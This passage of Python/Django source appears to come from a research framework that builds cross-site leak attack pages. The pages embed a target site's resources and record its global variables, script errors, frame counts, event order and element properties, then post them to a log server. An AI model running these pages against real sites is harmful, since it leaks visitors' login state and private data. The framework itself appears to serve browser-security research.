	        if (typeof(object[prop]) == 'function'){
	            continue;
	        }
	        simpleObject[prop] = object[prop];
	    }
	    return JSON.stringify(simpleObject); // returns cleaned up JSON
	};
	var logged_variables = Object.keys(window).filter(x => typeof(window[x]) !== 'function' &&
	  Object.entries(
	    Object.getOwnPropertyDescriptor(window, x)).filter(e =>
	      ['value', 'writable', 'enumerable', 'configurable'].includes(e[0]) && e[1]
	    ).length === 4);
	var vresults=[];
	for(var i=0; i< logged_variables.length;i++){
	    var logValue = window[logged_variables[i]];
	    var logValueString= '';
	    if(logValue == undefined){
	        logValueString= "undefined";
	    }else if(logValue == null){
	        logValueString= "null";
	    }else{
	        logValueString= simpleStringify(logValue);
	    }
	    vresults.push(logged_variables[i]+":::"+logValueString);

	  }
	window.vresults=vresults;
    </script>
	'''
	returnHTML = include_tag_in_body(html, js)
	return returnHTML




def get_variable_collection_messsage():
	return 'window.vresults'

# script inclusion error attack 
def attach_script_error_collector(html):
	js = '''
	<script type="text/javascript">
	window.logged_script_errors = [];
	window.onerror = function (errorMessage, resourceUrl, lineNo, columnNo, errorObject) {
		var data = [errorMessage, resourceUrl, lineNo, columnNo, errorObject];
		window.logged_script_errors.push(data);
  	return true;
	}; 
    </script>
	'''
	returnHTML = include_tag_in_body(html, js)
	return returnHTML

def get_error_collection_messsage():
	return 'window.logged_script_errors'


# @Note: must be attached after collector, so as to e.g. assign 
#        window.logged_variables or other window vars
def attach_script_log_sender(html, log_endpoint, runHashId, target_url, site_id, state_status, msg_as_json_string):
	js = '''
	<script type="text/javascript">
	console.log("hre");
	var postTestResults = function(){
		console.log("there");
		var logMessage = {
			"runHashId": "%s",
			"url": "%s", 
			"siteId": "%s",
			"state_status": "%s",
			"message": JSON.stringify(%s),
			"length": JSON.stringify(%s.length),
		}

	    request = $.ajax({
	        url: "%s",
	        contentType: "application/json; charset=utf-8",
	        type: "post",
	        data: JSON.stringify(logMessage),
	        dataType: 'text',
	        crossDomain: true,
	    });

	    // Callback handler that will be called on success
	    request.done(function (response, textStatus, jqXHR){
	        console.log("message sent to log server");
	        console.log(response)
	    });

	    // Callback handler that will be called on failure
	    request.fail(function (jqXHR, textStatus, errorThrown){
	        console.error("The following error occurred: "+ textStatus, errorThrown);
	    });
	}
	setTimeout(function() {
			postTestResults();
    	}, 4000);
	</script>
	'''%(runHashId, target_url, site_id, state_status, msg_as_json_string, msg_as_json_string, log_endpoint)

	returnHTML = include_tag_in_body(html, js)
	return returnHTML


# @Function: Django Controller - Http GET Handler
# @URL GET 'attack-page/script-vars/{site_id}/{state_status}'
def getScriptAttackPageVars(request, site_id, state_status):

	site_url = site_dict[site_id][0] 
	target_url_enc = request.GET.get("fr", site_url)
	target_url = decodeURL_Plus(target_url_enc)
	runHashId = request.GET.get("hash", "")
	log_server_endpoint = LOG_SERVER_BASE_DEFAULT + "record-script-message/0/"

	document_title = "script-attack-vars"
	html = get_base_dom_document(document_title)
	html = get_dom_with_script_included(html, target_url)
	html = attach_script_variable_collector(html)

	log_message = get_variable_collection_messsage()
	html = attach_script_log_sender(html, log_server_endpoint, runHashId,  target_url, 
		   site_id, state_status, log_message)

	return HttpResponse(html)

# @Function: Django Controller - Http GET Handler
# @URL GET 'attack-page/script-errs/{site_id}/{state_status}'
def getScriptAttackPageErrors(request, site_id, state_status):

	site_url = site_dict[site_id][0] 
	target_url_enc = request.GET.get("fr", site_url)
	target_url = decodeURL_Plus(target_url_enc)
	runHashId = request.GET.get("hash", "")
	log_server_endpoint = LOG_SERVER_BASE_DEFAULT + "record-script-message/1/"

	document_title = "script-attack-errs"
	html = get_base_dom_document(document_title)
	html = attach_script_error_collector(html)
	html = get_dom_with_script_included(html, target_url)


	log_message = get_error_collection_messsage()
	html = attach_script_log_sender(html, log_server_endpoint, runHashId, target_url, 
		   site_id, state_status, log_message)
	return HttpResponse(html)


# --------------------------------------------------------------------------- #
#				  Script Inclusion Attack - DATA Analysis
# --------------------------------------------------------------------------- #

def _get_current_timestamp():
	 return datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

# @Function: 
# compares the characters of target_str to ref_str and 
# gives + and - symbol for every char in target_str
# i.e. all steps to build from ref_str the target_str
def find_diff(ref_str, target_str):
  diff = difflib.ndiff(ref_str, target_str)
  previous_diff_type = None
  word = None
  diff_result = []
  diff = list(diff)
  length = len(diff)
  for idx, chars in enumerate(diff):
    diff_type = chars[0] # + or - or empty
    if diff_type == ' ':
      if word and (word is not None):
          diff_result.append([previous_diff_type, word])
          word = None
          previous_diff_type = diff_type
      continue
    if previous_diff_type == None or previous_diff_type == ' ':
      word = chars[-1]
    else:
      if diff_type == previous_diff_type:
        word += chars[-1]
      else:
        diff_result.append([previous_diff_type,word])
        word = chars[-1]
    previous_diff_type = diff_type
    if(idx == length-1):
      diff_result.append([previous_diff_type, word])
  return diff_result

def analyze_script_inclusion_results_errs(site_analysis_input_file, output_file):
	fp = open(site_analysis_input_file, 'r')
	lines = fp.readlines()
	linesCount = len(lines)
	loopCount = linesCount/2

	fpo = open(output_file, "a+")
	for i in range(loopCount):
		line = lines[i]
		line_vars_start_idx = line.index('[')
		url_and_status = line[: line_vars_start_idx]
		line = line[line_vars_start_idx:]

		corrosponding_line = lines[loopCount + i]
		corr_line_vars_start_idx = corrosponding_line.index('[')
		corrosponding_line = corrosponding_line[corr_line_vars_start_idx:]

		difference = find_diff(line, corrosponding_line)
		fpo.write(url_and_status+", "+ str(difference) + ";;;;\n")

	fp.close()
	fpo.close()

def analyze_script_inclusion_results_vars(site_analysis_input_file, output_file):
	fp = open(site_analysis_input_file, 'r')
	lines = fp.readlines()
	linesCount = len(lines)
	loopCount = linesCount/2

	fpo = open(output_file, "a+")
	for i in range(loopCount):
		line = lines[i]
		line_vars_start_idx = line.index('"')
		url_and_status = line[: line_vars_start_idx]
		line = line[line_vars_start_idx:]

		corrosponding_line = lines[loopCount + i]
		corr_line_vars_start_idx = corrosponding_line.index('"')
		corrosponding_line = corrosponding_line[corr_line_vars_start_idx:]

		difference = find_diff(line, corrosponding_line)
		fpo.write(url_and_status+", "+ str(difference) + ";;;;\n")

	fp.close()
	fpo.close()

# @Function: Django Controller - Http GET Handler
def getAnalysisScriptInclusionVars(request, siteId):
	timestamp = _get_current_timestamp()
	output_file_name = 'script-analysis-%s.html'%(timestamp)
	output_relative_dir = "automator/runs/script-inclusion/vars/%s/%s"%(siteId, output_file_name)
	output_abs_dir = os.path.join(ROOT_DIR,output_relative_dir)


	log_relative_dir =  "automator/runs/script-inclusion/vars/%s/"%(siteId)
	log_abs_dir = os.path.join(ROOT_DIR, log_relative_dir)
	logs_file_list = glob.glob(log_abs_dir+ r"script-log-*.txt")

	if(len(logs_file_list)==0):
		return HttpResponse("[404] no script log file.")

	log_file_abs_dir = logs_file_list[0]
	analyze_script_inclusion_results_vars(log_file_abs_dir, output_abs_dir)
	return HttpResponse("[200] analysis file generated")


def getAnalysisScriptInclusionErrs(request, siteId):
	timestamp = _get_current_timestamp()
	output_file_name = 'script-analysis-%s.csv'%(timestamp)
	output_relative_dir = "automator/%s/TestReports/ScriptInclusion/%s"%(siteId, output_file_name)
	output_abs_dir = os.path.join(ROOT_DIR,output_relative_dir)


	log_relative_dir =  "automator/%s/TestReports/ScriptInclusion/"%(siteId)
	log_abs_dir = os.path.join(ROOT_DIR, log_relative_dir)
	logs_file_list = glob.glob(log_abs_dir+ r"script-log-*.csv")

	if(len(logs_file_list)==0):
		return HttpResponse("[404] no script log file.")

	log_file_abs_dir = logs_file_list[0]
	analyze_script_inclusion_results_errs(log_file_abs_dir, output_abs_dir)
	return HttpResponse("[200] analysis file generated")


# --------------------------------------------------------------------------- #
#						Content Window Attack
# --------------------------------------------------------------------------- #



def get_dom_with_frame_included(html, frame_src):
	
	frame_tag = "<iframe id='targetFrame' src='%s' style='height:500px;width:1000px;'></iframe>"%frame_src
	returnHTML = include_tag_in_body(html, frame_tag)
	return returnHTML


# content window length attack 
def attach_content_window_length_collector(html, target_url):
	js = '''
	<script type="text/javascript">
	var url =  "%s";
	window.wp_spawned = window.open(url, "_blank");
	setTimeout(function() {
			window.frameCount = window.wp_spawned.length;
			window.wp_spawned.close();
			postContentWindowResults();
    	}, 12000);
    </script>
	'''%(target_url)
	returnHTML = include_tag_in_body(html, js)
	return returnHTML

def get_content_window_length_varname():
	return 'window.frameCount'



# @Note: must be attached after collector, so as to e.g. assign 
#        window.logged_variables or other window vars
def attach_content_window_log_sender(html, runHashId, frameurl, site_id, state_status, frame_count_as_variable, log_endpoint):
	js = '''
		<script type="text/javascript">
		var postContentWindowResults = function(){
			var logMessage = {
				"runHashId": "%s",
				"framedurl": "%s", 
				"siteId": "%s",
				"state_status": "%s",
				"frame_count": %s,
			}

		    request = $.ajax({
		        url: "%s",
		        contentType: "application/json; charset=utf-8",
		        type: "post",
		        data: JSON.stringify(logMessage),
		        dataType: 'text',
		        crossDomain: true,
		    });

		    // Callback handler that will be called on success
		    request.done(function (response, textStatus, jqXHR){
		        console.log("message sent to log server");
		        console.log(response)
		    });

		    // Callback handler that will be called on failure
		    request.fail(function (jqXHR, textStatus, errorThrown){
		        console.error("The following error occurred: "+ textStatus, errorThrown);
		    });
	    }
		</script>
	'''%(runHashId, frameurl, site_id, state_status, frame_count_as_variable, log_endpoint)

	returnHTML = include_tag_in_body(html, js)
	return returnHTML



# @Function: Django Controller - Http GET Handler
# @URL GET 'attack-page/content-window/{site_id}/{state_status}'
def getContentWindowLengthPage(request, site_id, state_status):

	site_url = site_dict[site_id][0] 
	target_url = request.GET.get("fr", site_url)
	target_url = decodeURL_Plus(target_url)
	runHashId = request.GET.get("hash", "")

	log_server_endpoint = LOG_SERVER_BASE_DEFAULT + "record-content-window/%s/"%site_id

	document_title = "content-window-length"
	html = get_base_dom_document(document_title)
	
	# to collect length: open a new window and not use frame due to CORS 
	# html = get_dom_with_frame_included(html, target_url)

	frame_count_varname = get_content_window_length_varname()
	html = attach_content_window_log_sender(html, runHashId, target_url, site_id, state_status, frame_count_varname, log_server_endpoint)
	html = attach_content_window_length_collector(html, target_url)

	return HttpResponse(html)

# --------------------------------------------------------------------------- #
#						EventFireCount Test
# --------------------------------------------------------------------------- #


def get_dom_with_iframe_included(html, frame_src):
	
	frame_tag = "<iframe id='targetFrame' src='%s' style='height:500px;width:1000px;'></iframe>"%frame_src
	returnHTML = include_tag_in_body(html, frame_tag)
	return returnHTML

def get_dom_with_scpt_included(html, script_src, script_type="text/javascript"):
	
	script_tag = "<script id='targetScript' type='%s' src='%s'></script>"%(script_type, script_src)
	returnHTML = include_tag_in_body(html, script_tag)
	return returnHTML

def get_dom_with_img_included(html, img_src):
	
	img_tag = "<img id='targetImage' src='%s' />"%(img_src)
	returnHTML = include_tag_in_body(html, img_tag)
	return returnHTML

def get_dom_with_link_included(html, link_href, rel="stylesheet"):

	link_tag = "<link id='targetLink' rel='%s' href='%s' />"%(rel, link_href)
	returnHTML = include_tag_in_body(html, link_tag)
	return returnHTML

def get_dom_with_object_included(html, object_data):

	object_tag = "<object id='targetObject' data='%s'></object>"%(object_data)
	returnHTML = include_tag_in_body(html, object_tag)
	return returnHTML

def get_dom_with_tag_included(html, tag_name, url):
	if tag_name == "iframe":
		returnHTML = get_dom_with_iframe_included(html, url)
	elif tag_name == "script":
		returnHTML = get_dom_with_scpt_included(html, url)
	elif tag_name == "img":
		returnHTML = get_dom_with_img_included(html, url)
	elif tag_name == "link":
		returnHTML = get_dom_with_link_included(html, url)
	elif tag_name == "object":
		returnHTML = get_dom_with_object_included(html, url)
	return returnHTML

def get_corresponding_attribute(tag_name):
	if tag_name == "img" or tag_name == "video" or tag_name == "audio" \
		or tag_name == "script" or tag_name == "track" or tag_name == "embed" \
		or tag_name == "iframe" or tag_name == "source" or tag_name == "input" \
		or tag_name == "frame":
		attribute = "src"
	elif tag_name == "applet":
		attribute = "code"
	elif tag_name == "link" or tag_name == "link_stylesheet" or tag_name == "link_prefetch" \
	 	or tag_name == "link_preload_style" or tag_name == "link_preload_script":
		attribute = "href"
	elif tag_name == "object":
		attribute = "data"
	elif tag_name == "videoPoster":
		attribute= "poster"
	return attribute

def attach_event_count_define_order_list(html):
	js = '''
	<script type="text/javascript">
		window.eventOrder=[];
	</script>
	'''
	returnHTML = include_tag_in_body(html, js)
	return returnHTML

def attach_event_count_define_order_list_frameset(html):
	js = '''
	<script type="text/javascript">
		window.eventOrder=[];			
	</script>
	'''
	returnHTML = include_tag_in_head(html, js)
	return returnHTML


# @DEPRECATED: Creates one tag (of the same type) per html event (e.g. onload)
def attach_event_count_log_collector(html, target_url, tag_name, event_name):
	attribute = get_corresponding_attribute(tag_name)
	varname="var%sCount"%event_name
	if tag_name == "input":
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("%s")
			tag.setAttribute("type", "image")
			tag.setAttribute("%s", "%s")
			window.%s = 0;
			tag.%s = function(){
				window.%s+=1;
				window.eventOrder.push("%s")
			}
			document.body.appendChild(tag);
		</script>
		'''%(tag_name, attribute, target_url, varname, event_name, varname, event_name)
	else:
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("%s")
			tag.setAttribute("%s", "%s")
			window.%s = 0;
			tag.%s = function(){
				window.%s+=1;
				window.eventOrder.push("%s")
			}
			document.body.appendChild(tag);
		</script>
		'''%(tag_name, attribute, target_url, varname, event_name, varname, event_name)
	returnHTML = include_tag_in_body(html, js)
	return returnHTML

def attach_global_event_count_log_collector(html, target_url, tag_name, event_list):
	attribute = get_corresponding_attribute(tag_name)
	if tag_name == "input":
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("%s");
			tag.setAttribute("type", "image");
			tag.setAttribute("%s", "%s");
			window.tag = tag;
		'''%(tag_name, attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(tag);
				</script>
				'''
		js = js + endJs
	elif tag_name == "videoPoster":
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("video");
			tag.setAttribute("poster", "%s");
			window.tag = tag;
		'''%(target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(tag);
				</script>
				'''
		js = js + endJs
	### A Single Attack Page for Link Tag (Warning: results may suffer from race-conditions in EF!!)
	# elif tag_name == "link":
	# 	js = '''
	# 	<script type="text/javascript">
	# 		var tag = document.createElement("link");
	# 		tag.setAttribute("%s", "%s");
	# 		tag.setAttribute("rel", "stylesheet");

	# 		var tag1 = document.createElement("link");
	# 		tag1.setAttribute("%s", "%s");
	# 		tag1.setAttribute("rel", "prefetch");

	# 		var tag2 = document.createElement("link");
	# 		tag2.setAttribute("%s", "%s");
	# 		tag2.setAttribute("rel", "preload");
	# 		tag2.setAttribute("as", "style");

	# 		var tag3 = document.createElement("link");
	# 		tag3.setAttribute("%s", "%s");
	# 		tag3.setAttribute("rel", "preload");
	# 		tag3.setAttribute("as", "script");

	# 		window.tag0 = tag;
	# 		window.tag1 = tag1;
	# 		window.tag2 = tag2;
	# 		window.tag3 = tag3;
	# 	'''%(attribute, target_url, attribute, target_url, attribute, target_url, attribute, target_url)
	# 	for event_name in event_list:
	# 		varname="var%sCount"%event_name
	# 		appendJs= '''

	# 			window.%s = 0;
	# 			window.tag0.%s = function(){
	# 				window.%s+=1;
	# 				window.eventOrder.push("%s");
	# 			}
	# 			window.tag1.%s = function(){
	# 				window.%s+=1;
	# 				window.eventOrder.push("%s");
	# 			}
	# 			window.tag2.%s = function(){
	# 				window.%s+=1;
	# 				window.eventOrder.push("%s");
	# 			}
	# 			window.tag3.%s = function(){
	# 				window.%s+=1;
	# 				window.eventOrder.push("%s");
	# 			}
	# 		'''%(varname, event_name, varname, event_name,  event_name, varname, event_name,  event_name, varname, event_name,  event_name, varname, event_name )
	# 		js = js + appendJs

	# 	endJs = ''' 
				
	# 			document.body.appendChild(window.tag0);
	# 			document.body.appendChild(window.tag1);
	# 			document.body.appendChild(window.tag2);
	# 			document.body.appendChild(window.tag3);
	# 			</script>
	# 			'''
	# 	js = js + endJs
	elif tag_name == "link_preload_script":
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("link");
			tag.setAttribute("%s", "%s");
			tag.setAttribute("rel", "preload");
			tag.setAttribute("as", "script");

			window.tag = tag;
		'''%(attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				window.tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(window.tag);
				</script>
				'''
		js = js + endJs
	elif tag_name == "link_preload_style":
		js = '''
		<script type="text/javascript">

			var tag = document.createElement("link");
			tag.setAttribute("%s", "%s");
			tag.setAttribute("rel", "preload");
			tag.setAttribute("as", "style");

			window.tag = tag;
		'''%(attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				window.tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(window.tag);
				</script>
				'''
		js = js + endJs
	elif tag_name == "link_prefetch":
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("link");
			tag.setAttribute("%s", "%s");
			tag.setAttribute("rel", "prefetch");

			window.tag = tag;
		'''%(attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				window.tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(window.tag);
				</script>
				'''
		js = js + endJs
	elif tag_name == "link_stylesheet":
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("link");
			tag.setAttribute("%s", "%s");
			tag.setAttribute("rel", "stylesheet");

			window.tag = tag;
		'''%(attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				window.tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(window.tag);
				</script>
				'''
		js = js + endJs
	elif tag_name == "object":
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("%s");
			tag.setAttribute("%s", "%s");
			window.tag= tag;
		'''%(tag_name, attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(tag);
				</script>
				'''
		js = js + endJs
	elif tag_name == "audio" or tag_name == "video":
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("%s");
			tag.setAttribute("%s", "%s");
			window.tag= tag;
		'''%(tag_name, attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(tag);
				</script>
				'''
		js = js + endJs
	elif tag_name == "source":
		js = '''
		<script type="text/javascript">
			var videoTag = document.createElement("video");
			var tag = document.createElement("%s");
			tag.setAttribute("%s", "%s");
			videoTag.appendChild(tag);
			videoTag.autoplay = true;
			window.sourceTag= tag;
			window.videoTag= videoTag;
		'''%(tag_name, attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(videoTag);
				</script>
				'''
		js = js + endJs
	elif tag_name == "track":
		js = '''
		<script type="text/javascript">
			var videoTag = document.createElement("video");
			videoTag.setAttribute("src", "https://interactive-examples.mdn.mozilla.net/media/examples/friday.mp4");
			var tag = document.createElement("%s");
			tag.setAttribute("%s", "%s");
			videoTag.appendChild(tag);
			videoTag.autoplay = true;
			window.trackTag= tag;
			window.videoTag= videoTag;
		'''%(tag_name, attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(videoTag);
				</script>
				'''
		js = js + endJs
	else:
		js = '''
		<script type="text/javascript">
			var tag = document.createElement("%s");
			tag.setAttribute("%s", "%s");
			window.tag = tag;
		'''%(tag_name, attribute, target_url)
		for event_name in event_list:
			varname="var%sCount"%event_name
			appendJs= '''

				window.%s = 0;
				tag.%s = function(){
					window.%s+=1;
					window.eventOrder.push("%s");
				}
			'''%(varname, event_name, varname, event_name)
			js = js + appendJs

		endJs = ''' 
				
				document.body.appendChild(tag);
				</script>
				'''
		js = js + endJs
	returnHTML = include_tag_in_body(html, js)
	return returnHTML

def attach_global_event_count_log_collector_frameset(html, target_url, tag_name, event_list):
	assert tag_name == "frame";
	attribute = get_corresponding_attribute(tag_name)
	js = '''
	<script type="text/javascript">
		$(document).ready(function(){
		var tag = document.createElement("frame");
		tag.setAttribute("%s", "%s");
		window.tag = tag;
	'''%(attribute, target_url)
	for event_name in event_list:
		varname="var%sCount"%event_name
		appendJs= '''

			window.%s = 0;
			tag.%s = function(){
				window.%s+=1;
				window.eventOrder.push("%s");
			}
		'''%(varname, event_name, varname, event_name)
		js = js + appendJs

	endJs = ''' 
			
			document.getElementById("frameset-container").appendChild(tag);
			});
			</script>
			'''
	js = js + endJs
	returnHTML = include_tag_in_head(html, js)
	return returnHTML


def get_event_count_log_varname(event_name):
	return "window.var%sCount"%event_name

def get_event_order_varname():
	return "window.eventOrder"

def attach_event_count_log_sender(html, runHashId, target_url, site_id, state_status, eventOrder, tag_name, log_endpoint):
	js = '''
		<script type="text/javascript">
		var postEventCountResults = function(){
			var uniqueEvents = Array.from(new Set(window.eventOrder));
			var event_count = { };
			for(var i=0; i<uniqueEvents.length; i++){
				event_count[uniqueEvents[i]]= eval("window.var"+uniqueEvents[i]+"Count");
			}
			var logMessage = {
				"runHashId": "%s",
				"target_url": "%s", 
				"siteId": "%s",
				"state_status": "%s",
				"event_order": JSON.stringify(%s),
				"tag": "%s",
				"event_count": JSON.stringify(event_count),
			}

		    request = $.ajax({
		        url: "%s",
		        contentType: "application/json; charset=utf-8",
		        type: "post",
		        data: JSON.stringify(logMessage),
		        dataType: 'text',
		        crossDomain: true,
		    });

		    // Callback handler that will be called on success
		    request.done(function (response, textStatus, jqXHR){
		        console.log("message sent to log server");
		        console.log(response)
		    });

		    // Callback handler that will be called on failure
		    request.fail(function (jqXHR, textStatus, errorThrown){
		        console.error("The following error occurred: "+ textStatus, errorThrown);
		    });
	    }
		setTimeout(function() {
				postEventCountResults();
	    	}, 6000);
		</script>
	'''%(runHashId, target_url, site_id, state_status, eventOrder, tag_name, log_endpoint)

	returnHTML = include_tag_in_body(html, js)
	return returnHTML

def attach_object_props_log_sender(html, runHashId, target_url, site_id, state_status, tag_name, log_endpoint):
	if tag_name == "object":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.contentDocument = (window.tag.contentDocument)? new XMLSerializer().serializeToString(window.tag.contentDocument) : convertToText(window.tag.contentDocument);
				// props.contentDocument = (window.tag.contentDocument)? "document": window.tag.contentDocument;
				props.contentWindowLength = (window.tag.contentWindow)? window.tag.contentWindow.length: "null";
				// props.form = (window.tag.form)? "HTMLFormElement": window.tag.form;
				props.form = convertToText(window.tag.form);
				props.validity = convertToText(window.tag.validity);
				props.willValidate = convertToText(window.tag.willValidate);
				props.validationMessage = convertToText(window.tag.validationMessage);
				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props),
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "video" or tag_name == "audio" or tag_name == "videoPoster":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.duration = convertToText(window.tag.duration);
				props.readyState = convertToText(window.tag.readyState);
				props.volume = convertToText(window.tag.volume);
				props.textTracks = convertToText(window.tag.textTracks);
				props.audioTracks = convertToText(window.tag.audioTracks);
				props.videoTracks = convertToText(window.tag.videoTracks);
				props.seeking = convertToText(window.tag.seeking);
				props.seekable = convertToText(window.tag.seekable);
				props.preload = convertToText(window.tag.preload);
				props.played = convertToText(window.tag.played);
				props.paused = convertToText(window.tag.paused);
				props.playbackRate = convertToText(window.tag.playbackRate);
				props.networkState = convertToText(window.tag.networkState);
				props.muted = convertToText(window.tag.muted);
				props.mediaGroup = convertToText(window.tag.mediaGroup);
				props.error = convertToText(window.tag.error);
				props.ended = convertToText(window.tag.ended);
				props.currentTime = convertToText(window.tag.currentTime);
				props.buffered = convertToText(window.tag.buffered);
				props.loop = convertToText(window.tag.loop);
				props.autoplay = convertToText(window.tag.autoplay);

				var logMessage = {
					"runHashId": "%s",
					"target_url": "%s", 
					"siteId": "%s",
					"state_status": "%s",
					"tag": "%s",
					"props": JSON.stringify(props),
				}

			    request = $.ajax({
			        url: "%s",
			        contentType: "application/json; charset=utf-8",
			        type: "post",
			        data: JSON.stringify(logMessage),
			        dataType: 'text',
			        crossDomain: true,
			    });

			    // Callback handler that will be called on success
			    request.done(function (response, textStatus, jqXHR){
			        console.log("message sent to log server");
			        console.log(response)
			    });

			    // Callback handler that will be called on failure
			    request.fail(function (jqXHR, textStatus, errorThrown){
			        console.error("The following error occurred: "+ textStatus, errorThrown);
			    });
		    }
			setTimeout(function() {
					postObjectProperties();
		    	}, 7500);
			</script>
		'''%(runHashId, target_url, site_id, state_status, tag_name, log_endpoint)
	elif tag_name == "source":
		js = '''
			<script type="text/javascript">
			function convertToText(obj) {
				if(typeof(obj) == undefined) return "undefined"
				if(obj == null) return "null"
			    //create an array that will later be joined into a string.
			    var string = []
			    //is object
			    //    Both arrays and objects seem to return "object"
			    //    when typeof(obj) is applied to them. So instead
			    //    I am checking to see if they have the property
			    //    join, which normal objects don't have but
			    //    arrays do.
			    if (typeof(obj) == "object" && (obj.join == undefined)) {
			        string.push("{");
			        for (prop in obj) {
			            string.push(prop, ": ", convertToText(obj[prop]), ",");
			        };
			        string.push("}");

			    //is array
			    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
			        string.push("[")
			        for(prop in obj) {
			            string.push(convertToText(obj[prop]), ",");
			        }
			        string.push("]")

			    //is function
			    } else if (typeof(obj) == "function") {
			        string.push(obj.toString())

			    //all other values can be done with JSON.stringify
			    } else {
			        string.push(JSON.stringify(obj))
			    }

			    return string.join("")
			}
			var postObjectProperties = function(){
				var props = { };
				
				props.duration = convertToText(window.videoTag.duration);
				props.readyState = convertToText(window.videoTag.readyState);
